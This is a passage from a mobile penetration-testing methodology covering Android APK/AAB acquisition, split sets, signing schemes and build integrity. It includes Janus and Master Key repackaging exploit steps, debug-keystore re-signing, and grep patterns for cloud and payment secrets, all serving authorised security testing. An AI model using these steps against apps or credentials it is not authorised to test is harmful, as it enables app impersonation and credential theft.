# D02 · APK/AAB Structure, Signing & Build Integrity

> This domain is about the shipped artefact itself: what is inside it, who signed it, whether the splits you tested are the splits users run, and whether anything anywhere actually trusts those bytes. Its honest severity ceiling is **P1 — but only through one door**: a live credential recovered from the package (`sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset`). Every signing-scheme, repackaging and obfuscation observation in this domain is pinned at **P5** and must be escalated or graveyarded.

| | |
|---|---|
| **Phases** | P2 acquisition & artefact inventory, P3 static analysis |
| **Milestones** | M2 (complete, provenance-proved artefact set), M3 (build-integrity verdict + secret liveness verdict) |
| **VRT ceiling** | **P1** — `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset`; sibling P1 route `insecure_os_firmware.hardcoded_password.privileged_user`. Integrity/update-channel work tops out at `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) unless you demonstrate code execution, and every "can be repackaged / decompiled / not obfuscated" observation is `lack_of_binary_hardening.*` (P5). |
| **Primary attacker model** | AM-03 zero-permission local app (debuggable, `run-as`, lib-drop, installer-cache substitution). AM-09 malicious backend/CDN for the update-channel items. AM-08 for the build-system items. AM-12 is *not* an attacker — a rooted device of your own never carries a D02 finding on its own. |
| **Maps to** | MASVS-RESILIENCE-2, MASVS-RESILIENCE-4, MASVS-CODE-3, MASVS-STORAGE-1, MASVS-PLATFORM; MASTG-TEST-0224, -0225, -0226, -0227, -0212, -0272, -0274; MASTG-TECH-0003, -0007, -0116, -0117, -0130, -0131, -0141, -0142, -0145, -0150, -0031, -0040; MASWE-0003, -0004, -0011, -0044, -0048, -0049, -0056, -0063; CWE-347, CWE-353, CWE-354, CWE-489, CWE-494, CWE-312, CWE-321, CWE-540, CWE-798, CWE-829, CWE-1357, CWE-1395, CWE-693; ATT&CK T1577, T1661, T1645, T1474.001, T1474.003, T1407, T1406, T1406.002, T1409, T1533, T1544, T1632, T1632.001, T1623.001 (analytic AN1730; mitigations M1001, M1002, M1004, M1006, M1011, M1012, M1013) |

## Why this domain pays

Mostly it does not — and you should know that before you spend a day here. The entire classical content of this domain (v1-only signing, 1024-bit keys, "the app can be repackaged", "the app is not obfuscated", "no binary hardening") is pinned at P5 by the Bugcrowd VRT, and `lack_of_binary_hardening` carries the impact vector `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N` — the taxonomy itself scores it at literally zero impact. Google's own Invalid Reports page says outright that being able to determine how an app works internally "is not a vulnerability". Grab, Spotify, Starbucks and Xiaomi all carry "lack of obfuscation / repackaging protection is out of scope" verbatim. Janus (CVE-2017-13156) is LEGACY. Master Key (CVE-2013-4787) is LEGACY. A v1-only APK is a hygiene note unless you can state a `minSdkVersion` that reaches a platform that still verifies v1 only.

There are exactly four doors out. **First, secrets.** A credential that is *live off-device* is the only reliable P1 this domain produces, and the split is brutal: the same string is P1 (`for_publicly_accessible_asset`), P3 (`for_internal_asset`), P4 (`pay_per_use_abuse`) or P5 (`intentionally_public_sample_or_invalid`) depending entirely on whether you proved liveness and what the asset is. **Second, the app's own installer/updater.** Any code path that fetches and installs or loads another APK/DEX/SO and verifies it itself is where the Criticals live — the Samsung Galaxy Store chain worked precisely because the custom verifier checked that the signature over the embedded digest was valid but never checked that the APK bytes hashed to that digest. **Third, `android:debuggable="true"` in a release build** — not the flag, which Android's own docs call "not considered a direct vulnerability", but the `run-as` sandbox read and the JDWP in-process code execution it hands a zero-permission local actor on a stock, non-rooted, production device. **Fourth, Play Feature Delivery fail-open**: removing the split that holds the attestation or licensing code, without touching `base.apk`'s signature at all.

Two base rates worth carrying. Oversecured's MavenGate measurement: 3,710 of 26,163 mavenCentral `groupId` domains (14.18%) were takeover-able, and 18.18% of dependencies were interceptable across repositories — with Gradle's default configuration performing no dependency validation whatsoever. And from the H1 corpus, the counter-example that defines the non-paying framing: Zivver #1225158, "ADB Backup is enabled within AndroidManifest", paid **$0**. The flag was the whole report. Contrast Evernote #1377748 and Mattermost #1115864, both rated High, both for landing a `.so` in the app's own native-library directory.

## The crux question

Does any security decision anywhere — this app's own self-check, a sibling app's signature-level permission, an in-app updater's verifier, or the backend — actually depend on this APK's signing identity or its unmodified bytes, because if nothing does, the only payable thing left in the package is a live secret.

## Triage order

1. **Provenance and completeness of the artefact set** (D02-001 → D02-005). Testing `base.apk` when the device runs base plus four splits produces false negatives across D03–D19, and a static review of the wrong binary is worse than no review. This is cheap and it gates everything.
2. **Secret sweep with a liveness proof** (D02-047). The only reliable P1 in the domain. Do it before anything signing-related, because it often ends the engagement's D02 work with a finding in hand.
3. **The three debug flags in one pass** (D02-029, -032, -033). One `aapt2 badging` and one `run-as` decide whether you have a no-root extraction path. Highest impact-per-second in the chapter.
4. **The app's own install / update / plugin path** (D02-025 → D02-028). If it exists, this is where Critical lives. If it does not exist, skip the whole group and say so.
5. **Does anything trust the signature** (D02-019 → D02-022). This single answer decides whether the entire signature-scheme group is a finding or hygiene, and whether repacking is even available to you as a tool.
6. **Split / feature-delivery fail-open** (D02-038, -039). Control removal by omission, with the base signature intact — the cleanest "High" shape the domain offers on a modern app.
7. **Repack-and-resign as a lever** (D02-022, -023, -045). Never a finding; often the only way to reach the flow under test on a non-rooted device.
8. **Signature scheme and certificate inventory** (D02-011 → D02-018). Cheap, mostly hygiene, but the signer SHA-256 you capture here is an input to D09 App Links and D03/D06 signature permissions — capture it once, reuse it.
9. **Build-system integrity** (D02-052 → D02-062). Source-access only. High ceiling, zero applicability black-box.
10. **Version rollback and platform install gates** (D02-063 → D02-068). Last because they need multiple builds or an OEM image, but D02-063 is genuinely under-tested and costs ten minutes.

## Items

### D02-001 · Artefact provenance record: hashes, acquisition path, signer and scheme set

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | — (methodology gate; every finding in this chapter inherits its artefact identity from here) |
| **Attacker** | n/a (engagement control) |
| **Applies to** | All |
| **Maps to** | MASTG-TECH-0003 (Obtaining and Extracting Apps), MASTG-TOOL-0123 (apksigner) |

- **Test:** Record, for every input byte, where it came from and what it hashes to. A client-supplied APK, a Play-downloaded APK and an APKMirror download of "the same version" routinely differ in signer, split set or content.
- **How:**
```bash
for f in apk/*.apk; do
  printf '%s\t%s\t%s\n' "$(shasum -a 256 "$f" | cut -d' ' -f1)" "$(stat -f%z "$f")" "$f"
done | tee evidence/ARTEFACT-MANIFEST.txt
apksigner verify --print-certs --verbose apk/base.apk | \
  grep -E 'Signer #1 certificate (SHA-256|DN)|Verified using v[1234] scheme|key (algorithm|size)'
aapt2 dump badging apk/base.apk | grep -E 'package:|sdkVersion|targetSdkVersion'
```
  Record in the report: acquisition source (`client SFTP 2026-09-02` / `adb pull from a Play-installed build` / `Play Console internal app sharing link`), SHA-256 of each split, signer SHA-256, and which schemes verified.
- **Proof:** An appendix table from which the client's own build engineer can re-derive every hash, alongside `versionName`/`versionCode`.
- **Escalation:** The signer SHA-256 is the input to the Digital Asset Links check (-> D09) and to every `checkSignatures`/signature-permission analysis (-> D03, -> D06). Capture once, reuse everywhere.
- **Ruled out when:** Never ruled out — this is not a test, it is the record that makes a disputed finding pinnable to an artefact. Its absence is itself a deliverable defect.

### D02-002 · The binary on the device is not the binary you were handed

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | — (methodology gate) |
| **Attacker** | n/a |
| **Applies to** | All; mandatory for AAB / split-APK / Play-Feature-Delivery apps |
| **Maps to** | drozer `tools.file.md5sum`, `tools.file.size`, `tools.file.download`; MASTG-TECH-0003, MASTG-TECH-0007 |

- **Test:** Hash the APK actually installed on the device and compare with the artefact you were given. Divergence invalidates the static half of the engagement until resolved.
- **How:**
```bash
adb shell pm path com.target.app          # prints base.apk AND every split
for p in $(adb shell pm path com.target.app | tr -d '\r' | sed 's/package://'); do adb pull "$p" device/; done
shasum -a 256 device/*.apk apk/*.apk
```
  drozer equivalent (path from `app.package.info -a <pkg>`, `APK path:` line):
```
dz> run tools.file.md5sum /data/app/com.target.app-1/base.apk
dz> run tools.file.size   /data/app/com.target.app-1/base.apk
dz> run tools.file.download /data/app/com.target.app-1/base.apk ./base_from_device.apk
```
- **Proof:** A SHA-256 mismatch between the device APK and the supplied artefact, or a `split_config.*.apk` present on the device that was never handed over.
- **Escalation:** Re-run all static analysis against the merged device set before touching any other domain.
- **Ruled out when:** Every hash in `device/` matches the corresponding hash in `apk/`, and `pm path` returns exactly the file set you were given (count them — a missing split is the usual failure).

### D02-003 · Truncated APK/XAPK acquisition — recover before concluding "no secrets"

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | — (methodology gate) |
| **Attacker** | n/a |
| **Applies to** | Third-party mirror acquisition (APKPure, APKMirror, Play extractors) |
| **Maps to** | `apk-redteam-pipeline` Stage 1 "XAPK vs APK" |

- **Test:** CDN rate-limiting returns a truncated XAPK with a missing end-of-central-directory signature. `unzip` fails, and an analyst who stops there loses the entire target. In the source engagement, 4 of 7 pulls were truncated.
- **How:**
```bash
file "<pkg>.apk"; wc -c < "<pkg>.apk"
unzip -o "<pkg>.apk" -d "extracted_<pkg>/" || 7z x -y "<pkg>.apk" -o"extracted_<pkg>"
unzip -Z1 "<pkg>.apk" | grep -c 'classes.*\.dex'
```
  On repeated truncation, rotate source IP and retry; fall back across Play-extractor -> APKPure -> APKMirror.
- **Proof:** `7z` recovers entries `unzip` rejected, and `classes*.dex` is present and parseable by jadx.
- **Escalation:** Unblocks the entire static pipeline; a truncated pull silently suppresses D11/D16/D18/D19.
- **Ruled out when:** `unzip -l` lists a complete central directory, the file size matches the mirror's advertised size, and the DEX count matches `aapt2 dump badging`'s expectation for the build.

### D02-004 · Pull the complete split set — and count what you pulled

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | — (methodology gate; suppresses false negatives across D03–D19) |
| **Attacker** | n/a |
| **Applies to** | All AAB-delivered apps (every Play-distributed app since August 2021) |
| **Maps to** | MASTG-TECH-0145 (Working with XAPK Files), MASTG-TECH-0003; `bb-methodology` PART 4 "Shell-Loop Ban" |

- **Test:** Native libraries, some resources and config-specific manifest fragments live only in splits. Pulling only `base.apk` silently removes the entire native surface and produces a false "no native code" verdict that suppresses all of D16.
- **How:**
```bash
adb shell pm path com.target.app | tr -d '\r' | sed 's/package://' > /tmp/paths.txt
wc -l /tmp/paths.txt                       # EXPECTED COUNT — write it down
mkdir -p splits && while read -r p; do adb pull "$p" splits/ || echo "FAILED: $p"; done < /tmp/paths.txt
ls -1 splits/*.apk | wc -l                 # MUST equal the expected count
for f in splits/*.apk; do echo "== $f"; unzip -l "$f" | grep -E '\.so$|classes.*\.dex'; done
```
- **Proof:** A `.so` or `classes*.dex` present in a config split and absent from `base.apk`, plus a pull count that matches the `pm path` line count.
- **Escalation:** Each split-only `.so` -> D16 JNI reachability; each split-only manifest fragment -> D03.
- **Ruled out when:** `pm path` returns a single line (a genuine single-APK app, or an APK sideloaded rather than installed from a bundle) **and** you verified that by `aapt2 dump badging base.apk | grep -i split` returning nothing. A zero-line `pm path` means the package is not installed — not that there are no splits.

### D02-005 · AAB handover: rebuild the device-exact split set with bundletool

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | — (methodology gate) |
| **Attacker** | n/a |
| **Applies to** | Any engagement where the handover artefact is an `.aab` |
| **Maps to** | bundletool `build-apks`, `get-device-spec`, `install-apks`, `extract-apks`, `--mode=universal`; `BUNDLE-METADATA/` in the AAB format |

- **Test:** The universal APK is not what users run. `--mode=universal` merges code that is never co-resident on a real device, and density/ABI/language splits differ per device. Build the set the *target device* would actually be served.
- **How:**
```bash
bundletool get-device-spec --output=lab/device-spec.json
bundletool build-apks --bundle=app.aab --output=lab/app.apks \
  --device-spec=lab/device-spec.json \
  --ks=lab/test.jks --ks-key-alias=test --ks-pass=file:lab/ks.pwd --key-pass=file:lab/key.pwd
bundletool extract-apks --apks=lab/app.apks --device-spec=lab/device-spec.json --output-dir=lab/splits
bundletool install-apks --apks=lab/app.apks --device-id=$SERIAL
unzip -l app.aab | grep -i 'BUNDLE-METADATA'      # ProGuard mappings ride here, unpackaged into APKs
```
- **Proof:** `lab/splits/` containing `base-master.apk` plus the config splits, and an installed app whose `pm path` output matches that set.
- **Escalation:** The `BUNDLE-METADATA/` tree carries the R8 mapping for free (-> D02-007). But note you signed this build with a *test* key: every signature-dependent conclusion must be re-verified against the store artefact (-> D02-006).
- **Ruled out when:** The client handed over signed APKs (not an AAB) that hash-match the device set per D02-002. A universal APK built with `--mode=universal` never satisfies this item.

### D02-006 · Play App Signing: the key you were handed is not the key users get

| | |
|---|---|
| **Severity ceiling** | Support (escalating to High in D09) |
| **VRT** | — (methodology gate; the consequence is rated in D09) |
| **Attacker** | n/a for the check; AM-03 for the resulting App Links hijack |
| **Applies to** | Every app distributed through Play with Play App Signing — the default for new apps since the Aug 2021 AAB-only publishing change |
| **Maps to** | Play App Signing (upload key vs app signing key), support.google.com/googleplay/android-developer/answer/9842756 |

- **Test:** With Play App Signing the developer signs with the **upload key** and Google re-signs the delivered APKs with the **app signing key**. Any finding whose mechanism depends on the signing certificate — `protectionLevel="signature"` permissions, `checkSignatures()`, Digital Asset Links `sha256_cert_fingerprints`, OAuth or Maps key restrictions, an SDK's allowed-signer allowlist — is evaluated against the wrong certificate if you test only the client's local build.
- **How:**
```bash
apksigner verify --print-certs apk/base.apk       | grep -i 'SHA-256'   # what you were given
apksigner verify --print-certs device/base.apk    | grep -i 'SHA-256'   # what users run (per D02-002)
curl -s https://target.example/.well-known/assetlinks.json | python3 -m json.tool
```
  Ask the client for the app signing key SHA-256: Play Console -> Protected with Play -> Play Store distribution -> Play app signing -> App signing key. Put it in the scoping sheet.
- **Proof:** Three fingerprints side by side. A mismatch between the `assetlinks.json` fingerprint and the **app signing key** is a verifiable App Links break; a mismatch between your test artefact and the store artefact invalidates every signature-dependent conclusion you drew.
- **Escalation:** -> D09 (unverified App Links fall back to the disambiguation dialog and a malicious app can register the same host filter). -> D18 (a Maps/Firebase key restricted to the *upload* key fingerprint is effectively unrestricted for the shipped app).
- **Ruled out when:** The store artefact's signer SHA-256 equals the handover artefact's signer SHA-256 *and* equals the `assetlinks.json` fingerprint. All three, not two.

### D02-007 · Obtain and load the R8 `mapping.txt` for the exact versionCode

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | — (methodology gate with a direct coverage consequence) |
| **Attacker** | n/a |
| **Applies to** | All source-assisted engagements; worth requesting for black-box work under NDA |
| **Maps to** | `app/build/outputs/mapping/$releaseVariant/mapping.txt`; `retrace` in `$ANDROID_HOME/cmdline-tools/latest/bin`; jadx `--mappings-path` with `-Prename-mappings.format=PROGUARD_FILE` |

- **Test:** "Full APK review" engagements routinely run against obfuscated DEX because nobody asked for the mapping file. With it, every finding cites real class and method names — the difference between a developer fixing it in an hour and arguing for a week.
- **How:** Request the archived copy for the exact `versionCode` in scope (AGP overwrites it on every build); it is also carried inside the AAB under `BUNDLE-METADATA/`. Then:
```bash
jadx --mappings-path mapping.txt --mappings-mode read \
     -Prename-mappings.format=PROGUARD_FILE -d jadx_out base.apk
"$ANDROID_HOME/cmdline-tools/latest/bin/retrace" mapping.txt trace.txt
```
- **Proof:** `jadx_out/sources` containing original package and class names; a retraced stack trace naming real frames.
- **Escalation:** Unobfuscated names make the D16 native/JNI, D17 deserialization and D12 key-management reviews tractable inside the budget rather than aspirational.
- **Ruled out when:** The shipped DEX is not obfuscated at all (class names in `jadx` output are already meaningful). If the client refuses the mapping, this is **not** ruled out — record it on the blocked register as a coverage limitation with a named cost ("native and reflection-heavy paths reviewed at reduced depth"), never as a silent gap.

### D02-008 · Source-to-artefact correspondence: does the repo you reviewed build the APK you tested

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | — (methodology gate) |
| **Attacker** | n/a |
| **Applies to** | Every engagement where source is supplied |
| **Maps to** | `apkanalyzer dex packages`, `apkanalyzer manifest print` (developer.android.com/tools/apkanalyzer) |

- **Test:** If the repo checkout and the APK diverge — a different branch, a patched dependency, a post-build script, a release-only ProGuard rule, an injected SDK — then every source-derived finding is about code that does not ship, and every shipped behaviour you did not see is uncovered.
- **How:**
```bash
git -C repo rev-parse HEAD | tee recon/reviewed-commit.txt
grep -rnE 'versionCode|versionName' repo/app/build.gradle*
apkanalyzer dex packages apk/base.apk | awk '$1=="P"{print $4}' | sort -u > recon/apk-packages.txt
grep -rhoE '^package [a-z][a-zA-Z0-9_.]+' repo --include='*.java' --include='*.kt' \
  | sed 's/^package //' | sort -u > recon/repo-packages.txt
comm -23 recon/apk-packages.txt recon/repo-packages.txt | tee recon/apk-only-packages.txt | wc -l
apkanalyzer manifest print apk/base.apk > recon/apk-manifest.xml
diff <(grep -oE '<(activity|service|receiver|provider)[^>]*android:name="[^"]+"' recon/apk-manifest.xml \
      | grep -oE 'android:name="[^"]+"' | sort -u) \
     <(grep -rhoE 'android:name="[^"]+"' repo/app/src/main/AndroidManifest.xml | sort -u)
```
- **Proof:** A correspondence note giving the reviewed commit, the artefact hash, the count of APK-only packages, and a disposition for each (in scope with source / in scope black-box / explicitly excluded).
- **Escalation:** `recon/apk-only-packages.txt` **is** your third-party inventory, derived from shipped bytes rather than from a `build.gradle` you hope is current -> D17, -> D18.
- **Ruled out when:** `comm -23` returns only known dependency namespaces already accounted for in the SBOM (D02-059), and the manifest component diff is empty. A non-empty diff is never "probably fine".

### D02-009 · Version-history mining: retired secrets that are still live, and the older hardcoded API surface

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the retired credential still authenticates; otherwise the severity of the weakened control found on the older API version |
| **Attacker** | AM-01 remote, no interaction (the credential works from your own host) |
| **Applies to** | Any app with published version history on a mirror |
| **Maps to** | `apk-redteam-pipeline` Anti-patterns ("Don't reverse only the latest version"); `hunt-shadow-api` Stages 1 & 3 |

- **Test:** Two distinct payloads live in old builds. (a) A credential removed from the current build is frequently still live server-side — the old APK is the only place the value survives. (b) A mobile app's hardcoded backend calls are frequently an **older API version** than the current web app uses, with weaker auth, weaker rate limits, weaker input validation and more field exposure. Build N-3 is that version, preserved.
- **How:** Pull older releases from the mirror's version-history pages, then re-run the secret sweep and the endpoint sweep against each:
```bash
for v in 7.4.1 7.2.0 6.9.3; do
  jadx -d "out_$v" "hist/com.target.app_$v.apk"
  grep -rEn '(AIza[0-9A-Za-z_\-]{35}|AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24,}|xox[baprs]-)' "out_$v" \
    | tee "loot/secrets_$v.txt"
  grep -rhoE 'https?://[a-zA-Z0-9._~:/?#@!$&()*+,;=%-]+' "out_$v/sources" | sort -u > "loot/hosts_$v.txt"
done
comm -23 loot/hosts_6.9.3.txt loot/hosts_7.4.1.txt     # endpoints only the old build knew about
```
  Then diff **behaviourally** across the versions for the same operation — auth strength (does the old path accept no token / an expired token / a lower-privilege token the current one rejects?), rate limiting (burst both; a missing 429 on the old path means throttling was never backported), input validation (same oversized/injection payload to both), field exposure (does the old path return internal IDs or PII the current version redacted?).
- **Proof:** For (a): the HTTP 200 (or `aws sts get-caller-identity` ARN) returned by the third party using the extracted key, alongside the file and line in the *old* build where it was found and its absence from the current build. For (b): the same request against both versions side by side, with the security regression visible.
- **Escalation:** -> D18 for a live cloud key; -> D15 for the shadow-API regression. **A version difference alone is Informational** — the weakened control is the finding, and the shape of the response is not the diff you are looking for.
- **Ruled out when:** Every endpoint reachable from an older build returns 404/connection-refused, *or* the same request to old and current paths produces identical auth enforcement, identical throttling behaviour over n≥10 interleaved samples, and identical field sets. Extracted credentials must be shown dead by an authentication attempt that fails, not by assumption that rotation happened.

### D02-010 · Record `minSdkVersion` and `targetSdkVersion` before running anything else

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | — (the qualifier attached to every other finding's "Applies to") |
| **Attacker** | n/a |
| **Applies to** | All |
| **Maps to** | `aapt2 dump badging`; CVE-2026-28576 compat gate `484953293 / enableAfterTargetSdk="36"` |

- **Test:** A large fraction of Android "the platform fixed that" claims are gated on the app's declared SDK levels. These two numbers turn several checks in this checklist from Informational into High, and the attacker chooses the target's `targetSdk` only in the sense that the developer already did.
- **How:**
```bash
aapt2 dump badging base.apk | grep -E 'sdkVersion|targetSdkVersion|package:'
grep -oE 'android:(min|target)SdkVersion="[0-9]*"' out/AndroidManifest.xml
```
  | Declared value | What it re-enables |
  |---|---|
  | `minSdk < 17` | `addJavascriptInterface` reflection-to-`Runtime.exec` RCE (-> D10) — **LEGACY** |
  | `minSdk < 24` | v1-only signing is verifiable by the install target (-> D02-012) — **LEGACY** |
  | `targetSdk < 17` | `<provider>` defaults to `exported="true"` (-> D07) — **LEGACY** |
  | `targetSdk < 24` | user-installed CA certs trusted by default (-> D14) |
  | `targetSdk < 28` | cleartext HTTP allowed by default (-> D14) |
  | `targetSdk < 29` | native code may be executed from the app's internal data storage (ATT&CK M1006) (-> D17) |
  | `targetSdk < 30` | unrestricted package visibility / `queryIntentActivities` enumeration (-> D01, -> D09) |
  | `targetSdk < 31` | components with an `<intent-filter>` default to exported; `PendingIntent` mutability unenforced (-> D04, -> D08); `adb backup` still includes app data (-> D02-031) |
  | `targetSdk < 33` | non-type-safe `getParcelableExtra(String)` is the default idiom (-> D17) |
  | `targetSdk ≤ 36` on Android 17 | `ENFORCE_STRICT_SQL_CHECKS` (change id `484953293`) is **off** -> CVE-2026-28576-class provider SQLi (-> D07) |
  | API 34+ device | trust store moved to the Conscrypt APEX; `/system/etc/security/cacerts` is ignored at runtime (-> D02-046, -> D14) |
- **Proof:** The `aapt2 badging` line itself, quoted in the report as the precondition for each dependent finding.
- **Escalation:** Everything. This is the single most reused fact in the engagement.
- **Ruled out when:** Never — record it or your dependent findings are unratable.

### D02-011 · Signature-scheme inventory: which of v1/v2/v3/v3.1/v4 actually verify

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | — (baseline; the findings are D02-012 through D02-018) |
| **Attacker** | n/a |
| **Applies to** | All. v2 from Android 7.0; v3 (key rotation) from Android 9.0; v3.1 from Android 13; v4 from Android 11 |
| **Maps to** | MASTG-TECH-0116, MASTG-TOOL-0123 (apksigner); source.android.com/docs/security/features/apksigning |

- **Test:** The signing certificate is what binds the app's UID, its signature-level permissions, its `sharedUserId` group and its update identity. Establish which schemes verify and capture the signer digest before anything else in this group.
- **How:**
```bash
apksigner verify -v --print-certs base.apk
# Verified using v1 scheme (JAR signing): true|false
# Verified using v2 scheme (APK Signature Scheme v2): true|false
# Verified using v3 scheme (APK Signature Scheme v3): true|false
# Verified using v3.1 scheme ... / v4 scheme ...
# Signer #1 certificate DN / SHA-256 digest / key algorithm / key size (bits)
unzip -l base.apk | grep -E 'META-INF/.*\.(RSA|DSA|EC|SF)|META-INF/MANIFEST.MF'
keytool -printcert -jarfile base.apk
```
- **Proof:** The verbatim scheme booleans plus `Signer #1 certificate SHA-256 digest`. v2/v3 store the signature-algorithm ID list *inside* signed data specifically to defeat signature stripping — note which schemes are present, not just that "it is signed".
- **Escalation:** The SHA-256 digest feeds D09 (`assetlinks.json`), D03 (`knownSigner` / custom permissions) and D06 (peer `checkSignatures`).
- **Ruled out when:** n/a — this is the inventory, not a test. The *findings* below are ruled out individually.

### D02-012 · v1-only signing: Janus DEX prepend (CVE-2017-13156)

| | |
|---|---|
| **Severity ceiling** | Medium — High only with a successful `adb install -r` on an in-scope OS version |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies, CWE-347); `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) if delivered over an update channel |
| **Attacker** | AM-02 remote one click (sideload lure) / AM-03 if the attacker already has an install channel |
| **Applies to** | **LEGACY.** v1-only APKs whose `minSdkVersion` reaches Android 5.0–8.0. Janus was fixed at the 2017-12-01 patch level and not backported until 8.1; v1 was removed and v4 introduced in Android 11. MASTG-TEST-0224 fails the app when `minSdkVersion >= 24` and only v1 verifies. |
| **Maps to** | MASTG-TEST-0224, MASWE-0056 (CWE-347), MASVS-RESILIENCE-2, CVE-2017-13156 (EDB 47601 Metasploit module); ATT&CK T1577 (names the Janus vulnerability and the repackaging path), analytic AN1730, mitigations M1001/M1006 |

- **Test:** The v1 (JAR) scheme does not cover the whole APK file. On an affected platform, a DEX prepended to the archive is executed by the runtime while the JAR verifier reads the central directory and still validates — code substitution under the legitimate package identity.
- **How:**
```bash
apksigner verify --verbose h5.apk            # v1=true, v2=false, v3=false
apktool -s d h5.apk && grep -i minSdk h5/apktool.yml
apktool -s d donor.apk && mv donor/classes.dex .
python janus.py classes.dex h5.apk kal-h5.apk    # V-E-O/PoC CVE-2017-13156
# or: go run main.go -apk ../apps/InjuredAndroid.apk   (h0tak88r/j88nx)
adb install h5.apk
adb install -r kal-h5.apk                    # THE TEST: update, not fresh install
```
- **Proof:** `adb install -r kal-h5.apk` **succeeds** — the package manager accepts the modified APK as a legitimate update of the original signature — and the injected DEX then runs with the victim package's UID, data directory and granted permissions. The successful `-r` install *is* the finding; the scheme booleans alone are not.
- **Escalation:** Full app impersonation -> D11 (token theft from the victim's own `shared_prefs`) -> D13. The repackaged build is also the delivery vehicle for injected pinning removal (-> D14), added permissions (-> D03) and an injected JS bridge (-> D10) — ship one PoC APK demonstrating the chain, not four reports.
- **Ruled out when:** `apksigner verify --verbose` shows v2 **or** v3 `true` (both schemes cover the whole archive), **or** `minSdkVersion >= 24` with the platform enforcing v2 at install, **or** the test device's `ro.build.version.security_patch` is at or after 2017-12-01 and `adb install -r` returns `INSTALL_PARSE_FAILED_NO_CERTIFICATES` / a signature mismatch. Note that an app signed v1 **plus** v2/v3 is still exposed when run on 5.x/6.x — state the platform range, not just the scheme set.

### D02-013 · Duplicate ZIP-entry / "Master Key" class

| | |
|---|---|
| **Severity ceiling** | Low (LEGACY; High only if it actually reproduces) |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies) |
| **Attacker** | AM-02 |
| **Applies to** | **LEGACY.** Long fixed on every supported Android. Do not report without a successful install on an in-scope OS version. |
| **Maps to** | CVE-2013-4787 (EDB 38627), CVE-2013-6792 (EDB 38821); sec-88 "Signing the APK" — Blue Box Key Vulnerability |

- **Test:** Add a second DEX under a near-name, then hex-edit the central-directory entry so both entries read `classes.dex`; a vulnerable verifier validates one entry and the loader takes the other.
- **How:**
```
1. Add classez.dex to the APK.
2. Open the archive in a hex editor (ghex) and search for "classez.dex".
3. Replace the 'z' with 's' — the APK now holds two entries named classes.dex.
4. adb install -r; a vulnerable verifier accepts the signature and loads the attacker's DEX.
```
- **Proof:** Install succeeds and the attacker's DEX executes — same observable as Janus: `adb install -r` accepted, injected code runs as the victim UID.
- **Escalation:** Identical to D02-012.
- **Ruled out when:** `adb install -r` fails on every in-scope OS version with a parse or signature error. On a current platform expect rejection; treat a modern reproduction as surprising and verify very carefully before reporting. An engagement whose lowest in-scope Android version is 5.0 or above rules this out on the platform range alone.

### D02-014 · APK signing key below 2048-bit RSA

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies) — realistically Low; there is no practical forgery today |
| **Attacker** | n/a (no realistic attacker at 1024-bit today) |
| **Applies to** | All |
| **Maps to** | MASTG-TEST-0225 (Usage of Insecure APK Signature Key Size), MASWE-0056 (CWE-347), MASVS-RESILIENCE-2, MASTG-TECH-0116, MASTG-TOOL-0123 |

- **Test:** MASTG-TEST-0225 fails when the signer key size is under 2048 bits (RSA).
- **How:**
```bash
apksigner verify --print-certs --verbose base.apk | grep -E 'key algorithm|key size|SHA-256 digest'
```
- **Proof:** `Signer #1 key size (bits): 1024` — the exact failing example given in MASTG-TEST-0225 — versus `2048` passing. Capture the `Signer #1 certificate SHA-256 digest` line in the same pass; you need it for D09.
- **Escalation:** Do not file this alone. Fold it with D02-012 and D02-015 into a single "app integrity is not cryptographically assured" hygiene item rather than three separate Lows.
- **Ruled out when:** `key size (bits)` is 2048 or greater for every signer, or the key algorithm is EC with a curve of adequate size (an EC key has no 2048-bit threshold — do not mis-apply the RSA test to it).

### D02-015 · Signer certificate identity: the Android debug certificate or a weak signature algorithm

| | |
|---|---|
| **Severity ceiling** | High (debug certificate) / Low (SHA1withRSA alone) |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies); escalates via `broken_access_control.privilege_escalation` (varies) when a signature-level permission depends on that certificate |
| **Attacker** | AM-03 zero-permission local app signed with the same publicly-known debug key |
| **Applies to** | All |
| **Maps to** | Hrishikesh C07 "Weak Signer Certificate" items 1 and 3; sec-88 checklist §7; Het Mehta Phase 2 |

- **Test:** A production APK signed with the Android debug key (`CN=Android Debug, O=Android, C=US`) is signed with a *publicly available private key* — anyone can re-sign and ship updates to that package, and any app they build satisfies `protectionLevel="signature"` against it. A `SHA1withRSA` or `MD5withRSA` signature algorithm is the weaker, separate observation.
- **How:**
```bash
apksigner verify --print-certs --verbose base.apk
# inspect: "Signer #1 certificate DN:", "Signer #1 key algorithm:", the signature algorithm line
keytool -printcert -jarfile base.apk
grep -nE 'protectionLevel="[^"]*signature' out/AndroidManifest.xml
```
  For the debug-cert case, prove impact: re-sign a modified APK with the standard debug keystore (`~/.android/debug.keystore`, password `android`) and install it with `-r` over the original.
- **Proof:** `CN=Android Debug` in the DN line, plus a successful `adb install -r` of a build you signed with the stock debug keystore, plus a second stub app signed the same way being granted a `signature`-protected custom permission declared by the target.
- **Escalation:** -> D03 (the custom-permission model collapses: every `signature` permission is effectively public) -> D06 (drive the target's protected AIDL interface from your stub).
